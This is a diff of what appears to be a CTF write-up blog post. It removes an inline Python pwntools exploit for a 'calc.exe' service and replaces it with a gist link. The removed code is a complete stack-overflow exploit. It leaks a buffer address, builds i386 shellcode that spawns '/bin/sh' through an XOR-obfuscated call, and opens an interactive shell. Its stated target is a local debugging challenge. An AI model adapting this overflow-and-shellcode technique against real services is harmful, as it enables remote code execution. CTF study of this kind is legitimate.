@@ -70,54 +70,5 @@ call ebx  # spawn(%x, %x, %d)
 ### exp.py
 
 可以用 redos 中的 level1 本地调试。
-{% highlight python %}
-#!/usr/bin/env python
-# coding=utf8
 
-from pwn import p32, remote, context, asm, shellcraft
-
-import sys
-
-context.arch = 'i386'
-
-p = remote('localhost', 9447)
-
-p.recvuntil('Welcome to calc.exe\n')
-
-p.sendline('get_buf_addr')
-buf_addr = int(p.recvline().split()[-1], 16)
-ecx_set = buf_addr + 0x98 - 16 - 4 + 4
-shellcode_addr = buf_addr + 0x98 - 16 - 4 + 4*2 + 0x20
-
-shellcode_str = (
-    '''
-    {}
-    mov edi, esp
-    {}
-    push edi
-    push edi
-    push 0xdeadbeef  /* junk */
-    mov ebx, {}
-    xor ebx, 0x12121212
-    call ebx  # spawn(%x, %x, %d)
-    '''.format(shellcraft.i386.pushstr('/bin/sh'),
-               shellcraft.i386.push(1),
-               0x10011a ^ 0x12121212)
-)
-print shellcode_str
-shellcode = asm(shellcode_str)
-
-payload = 'A' * (0x98 - 16 - 4) + \
-    p32(shellcode_addr) + \
-    p32(ecx_set) + 'A' * 0x20 + \
-    shellcode
-
-if '\n' in payload or '\x00' in payload:
-    print 'newline or zero byte found in payload'
-    sys.exit(1)
-
-p.sendline(payload)
-p.sendline("201527 0")
-
-p.interactive()
-{% endhighlight %}
+{% gist cubarco/b4aee1ac22f1b3039d30 %}
